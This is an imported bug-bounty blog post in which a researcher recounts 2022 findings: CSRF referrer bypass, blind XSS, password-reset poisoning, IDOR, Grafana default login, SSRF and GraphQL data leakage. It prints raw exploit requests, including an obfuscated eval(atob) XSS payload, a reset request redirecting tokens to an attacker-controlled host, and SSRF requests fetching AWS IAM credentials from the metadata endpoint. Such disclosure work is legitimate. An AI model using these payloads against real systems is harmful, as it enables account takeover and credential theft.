---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-09_2022-a-year-of-fascinating-discoveries.md
original_filename: 2023-01-09_2022-a-year-of-fascinating-discoveries.md
title: '“2022: A Year of Fascinating Discoveries”'
category: documents
detected_topics:
- csrf
- ssrf
- cloud-security
- mobile-security
- sso
- idor
tags:
- imported
- documents
- csrf
- ssrf
- cloud-security
- mobile-security
- sso
- idor
language: en
raw_sha256: b6a4608a007913135eb68bfa7d15182619a3f2a2ad4295bb9254db332570ce7d
text_sha256: d1b5cd61961ae76efede91d2bf51d1fb2c4aaa6fba8c97c739d2ce7a235b88d5
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: true
---

# “2022: A Year of Fascinating Discoveries”

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-09_2022-a-year-of-fascinating-discoveries.md
- Source Type: markdown
- Detected Topics: csrf, ssrf, cloud-security, mobile-security, sso, idor
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: True
- Raw SHA256: `b6a4608a007913135eb68bfa7d15182619a3f2a2ad4295bb9254db332570ce7d`
- Text SHA256: `d1b5cd61961ae76efede91d2bf51d1fb2c4aaa6fba8c97c739d2ce7a235b88d5`


## Content

---
title: "“2022: A Year of Fascinating Discoveries”"
url: "https://dhakalbibek.medium.com/2022-a-year-of-fascinating-discoveries-d3277dfb006f"
authors: ["dhakal_bibek (@dhakal__bibek)"]
bugs: ["CSRF", "SSRF", "Blind XSS", "Password reset", "Hyperlink injection", "IDOR", "Weak credentials", "AWS misconfiguration"]
publication_date: "2023-01-09"
added_date: "2023-01-11"
source: "pentester.land/writeups.json"
original_index: 1686
scraped_via: "browseros"
---

# “2022: A Year of Fascinating Discoveries”

“2022: A Year of Fascinating Discoveries”
dhakal_bibek
Follow
10 min read
·
Jan 9, 2023

403

1

“Hello and welcome to my writeup! In this report, I will be sharing details about some of the vulnerability that I discovered in redirected.com. I will provide a brief overview of the issue, a step-by-step breakdown of how I discovered and exploited them, and some recommendations on how you can find some similar vulnerabilities.

Without further ado, let’s dive into the details of the vulnerability.”

I have created this writeup on the basic of uniqueness, logic being used to exploit those bugs, the business impact and some of them are even funny:

Some of my findings of 2022:

Referrer based CSRF protection bypass:

Blind XSS in the Super admin panel of xyz, bypassing the one-time name limitation

Password reset link poisoning

IDOR vulnerability, which allows an attacker to find out the information of private videos of any user.

Account takevoer of Grafana(FOSS/OSS) due to default login in https://grafana.stg.ddd.xxx.xxx.redirect.com/

In-scope AWS bucket takeover.

IDOR vulnerability in GraphQL, leading to the leak of 10 million PII of the victim on https://graphql-catalog.app.redirect.com

Exploiting SSRF in xyz.com

Access control worth $2000 (everyone missed this IDOR+Access control between two admins.)

Brute-forcing the login page of a more than 9-year-old HackerOne public program using an iOS device:

Referrer based CSRF protection bypass:

One way that attackers can bypass referrer-based CSRF protection is by using a technique called “referrer hiding.”

To execute a referrer hiding attack, an attacker would create a webpage that contains a form or a link to a vulnerable website. When a user clicks on the form or link, a request is sent to the vulnerable website using the user’s browser. However, the attacker can manipulate the referrer information included in the request so that it appears to come from a trusted website rather than the attacker’s own webpage.

The site was using the referrer policy to protect against the CSRF attack and it could be bypassed by hosting the custom domain https://target.net.ourdomain.com/ . This domain bypasses the regex used to protect the CSRF attacks as the developer was checking whether the site contains target.net only. Due to this reason we were able to bypass it by adding .ourdomain.com

Here is an example of a regex pattern that was used by the developer to protect us from the CSRF attack

^(https?://)?([\da-z\.-]+)\.([a-z\.]{2,6})([/\w \.-]*)*\/?@$

It is possible that the regex pattern I provided above could potentially be bypassed by using a URL with a .ourdomain.com subdomain. This is because the pattern allows for any subdomain to be used, as long as it is followed by a period and a top-level domain (e.g., .com, .org, .net, etc.).

Referer: https://target.net.ourdomain.com

This can allow the attacker to bypass referrer-based CSRF protection, as the vulnerable website may not suspect that the request is actually coming from an untrusted source.

To prevent referrer hiding attacks, it is important to use strong, secure methods of CSRF protection, such as unique tokens or challenge-response mechanisms. It is also a good idea to regularly review and update your website’s security measures to ensure that they are effective against the latest threats.

Blind XSS in the Super admin panel of xyz bypassing one time name limitiation

Blind XSS exploited XYZ’s admin interface by circumventing the one-time name restriction. The coder assumed that the attacker would not be able to intercept the request and modify their name to a blind XSS payload, which would trigger on the admin panel. Since the name could not be changed twice, I was able to bypass this protection mechanism by intercepting the request to change the password=***REDACTED*** and open the iOS application.
Log in to the app.
Go to the profile or settings section of the app where you can change your password.
Now, intercept the request and change your name:
POST /en-gb/register/savePassword HTTP/1.1
Host: my.xxx.eu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://my.xxx.eu/en-gb/register/enterPassword
Content-Type: application/x-www-form-urlencoded
X-XSRF-TOKEN: XXXXXXXXXXXXXxxxxxxXXXXX
Content-Length: 117
Origin: https://my.xxx.eu
DNT: 1
Connection: close
Cookie: XXXXXXXXXXXXXXXxxxxxxXXXXx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

nationality=NO&initials=my_first_name&lastName=XSSPAYLOAD!!!&password=***REDACTED***

5. Set the payload "><input onfocus=eval(atob(this.id)) id=XXXXXXXXXXXXxxxxxxxxxxxxxxxxxxxxxxxXxxxxxxXXXXxxxXXXxx autofocus> as your initials/lastName.

6. Save the changes to your profile.

Press enter or click to view image in full size
XSS in the super admin panel of xyz.com
Password reset link poisoning

Steps To Reproduce:

1: Make the below request with the victims email address and you can use baseURL as the burp collaborator link.

POST /pub/v1/users/reset-password/send-email HTTP/1.1
Host: account-api.redirect.com.sg
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxxxx.xxxx.com.sg/your-profile/
content-Type: application/json
Origin: https://subscribe.redirect.com.sg
Content-Length: 166
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site

{"loginId":"victimsEmail@gmail.com","svcFlag":"reg_eshop","baseURL":"https://XXXXxxxXXXXX.burpcollaborator.net","lang":"en","type":"createPassword"}

2: Now, the email is send to the victims email. That should look like below:

3: Now notice the ?createPassword=***REDACTED*** being added to your burp collaborator link.

4: When the link is clicked by victim, the createPasswordKey is send to an attacker account.

Press enter or click to view image in full size
Press enter or click to view image in full size
IDOR vulnerability which leads an attacker to find out the information of private videos of any users.

Summary:

Hello team,

I have found a security vulnerability in your platform that allows an attacker to find out the information, such as themes, soundtrack, length_supported, etc., of a private video of any victim. The vsid parameter is encrypted in the web application and is completely random, but when we make this API request using an iOS device, it becomes numerical.

Steps To Reproduce:

I am using Crane application to create multiple container in an ios device:

1: From your IOS device, make a GET request to /api/XxxXX/creds?vsid=xxxxxx

Your Request should look like below:

Press enter or click to view image in full size

2: Make a GET request to a private video’s vsid.

Get dhakal_bibek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

3: You will get the information about the victims Private video.

?vsid=579306897 parameter is vulnerable to IDOR attack, which is exposing the information about the private videos

Impact

An attacker is able to find out the information about the victims private video by exploiting this vulnerability.

Can’t give more information about this bug as it is still in the state of pending review from the internal team.

Account takevoer of Grafana(FOSS/OSS) due to default login in https://grafana.stg.ddd.xxx.xxx.redirect.com/

Grafana is an open-source platform for data visualization and monitoring. It is possible for an attacker to take over a Grafana account if the default login credentials are not changed by the user. By default, the username for Grafana is “admin” and the password is “admin”. It is important to change these default login credentials to something unique and secure. Here I was able to login to grafana using the default credentials.

Summary:

Hello team,

I had found the default login of your grafana and was able to takeover at https://grafana.stg.4988b21.ddd.xxx.redirect.com/

Steps To Reproduce:

1: Go to https://grafana.stg.4988b21.ddd.xxx.redirect.com/

2: Login to grafana using username as “admin” and password as “Test@123”

3: You will be logged in to grafana.

Press enter or click to view image in full size
In-scope AWS bucket takeover.

A subdomain takeover is a type of vulnerability that allows an attacker to take control of a subdomain that is no longer being used or has been configured incorrectly. This can happen when a subdomain is pointed to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deactivated, but the DNS records for the subdomain have not been updated. If an attacker is able to claim ownership of the service, they can then use the subdomain to host malicious content or launch phishing attacks.

Press enter or click to view image in full size
Press enter or click to view image in full size
It is funny as it was in scope domain.
IDOR vulnerability in graphql leading to 10 million PII leakage of victim in https://graphql-catalog.app.redirected.com

Story about more then 10 million PII leakage in redirect.com exploiting GraphQL…

I was using the older version of BurpSuite, which includes the spider function, instead of the new version, which only includes the crawl function in the professional version. It’s important to use both versions because we don’t want to miss anything. I discovered a deep subdomain while spidering, and then I tried to find a vulnerability in the GraphQL-enabled subdomain. When I got stuck, I asked my professor, Mr. Hari Regmi, for help because he is very knowledgeable about GraphQL exploitation.

About this vulnerability

The vulnerability was an IDOR and was disclosing information’s about more then 10 million users. The PII’s were phone number, email, locations, and so on…

Whats cool about this vulnerability?

1: Interception query was disabled, which means we have to manually craft the graphQL request.

2: It was disclosing more then 10 million PII’s, if was found by some malicious actors then it could have been a disaster.

3: It is related with the graphQL.

Steps to reproduce:

1: Make the below POST request using the victims userID

POST /?p=graphql HTTP/1.1
Host: graphql-catalog.xxx.redirect.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/json
Content-Length: 106
{"query": "query {user(id:\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"){id,email,firstName,phoneNumber}}"}
Press enter or click to view image in full size

2: Request like below are disclosing the userID as, get parameter are used in wild reveling the userID. An attacker on the same network is able to get the userID of the victims just by intercepting the network traffic. Also the userID is being leaked in the image url if the user has made their profile public.

GET /content/DecryptRewardsCode?encryptedRewardsCode=OZ1KPJKMiI7EH2vOfAJ98QMFxpC6iR1CeRtpKpRxd9hHfF%2BMLrU9WcP9Dqj6EJ9DNEGRfZsR%2Fs6p2wTWRQvxExfBjRwN%2B4lSvHQp9odcNBE%3D  HTTP/1.1
Host: np.redirect.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Thu, 06 Jan 2022 07:14:04 GMT
Cache-Control: max-age=0
Exploiting SSRF in xyz.com

1: Send the POST request setting your url as http://169.254.169.254/latest/meta-data/iam/security-credentials/deep-source-snapshot-access-role to update the URL as

POST /cache/ HTTP/1.1
Host: snapshot-proxy.redirect.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Content-Length: 107
Origin: https://staging.redirect.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Referer: https://staging.redirect.io/
Connection: close

{“url”:”http://169.254.169.254/latest/meta-data/iam/security-credentials/xxx-source-snapshot-access-role"}

2: Now, send the get request:

GET /cache/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/redirect-source-snapshot-access-role HTTP/1.1
Host: snapshot-proxy.redirect.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Origin: https://staging.redirect.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Referer: https://staging.redirect.io/
Connection: close
Press enter or click to view image in full size
Press enter or click to view image in full size
Access control worth $2000 (everyone missed this IDOR+Access control between two admins.)

I have published a writeup regarding this vulnerability back then. You can read it from the below link:

Access control worth $2000 (everyone missed this IDOR+Access control between two admins.)
Tribute to Binit Ghimire

medium.com

Brute-force in the login page of more than 9 years old hackerone’s public program using an IOS device:

I don’t think I should be explaining about this bug as all the researcher knows this bug. If you are willing to join in ios hacking journey then fell free to ping me in twitter. This bug was hanging there for more then 9 years and till this date no one had reported this issue.

Press enter or click to view image in full size

You can find easy bugs like this more easily if you focus on iOS or Android applications, rather than web applications. This is because fewer people (less than 10%) focus on iOS apps, while more (over 20%) focus on Android apps. As a result, the probability of finding such bugs is higher in iOS or Android apps.

Why I am forcing you guys to connect in the ios hacking journey?
Because there are fewer people working on iOS and vulnerabilities like this are common in iOS applications, once you’ve completed all of the necessary steps like jailbreaking, bypassing SSL pinning, and bypassing jailbreak detection, you will likely find vulnerabilities.

I hope you enjoyed this story, feel free to follow me on Twitter/Instagram and clap to this story, until next time.

https://twitter.com/dhakal__bibek
https://www.instagram.com/dhakal_bibk/

Till then, バイバイ.
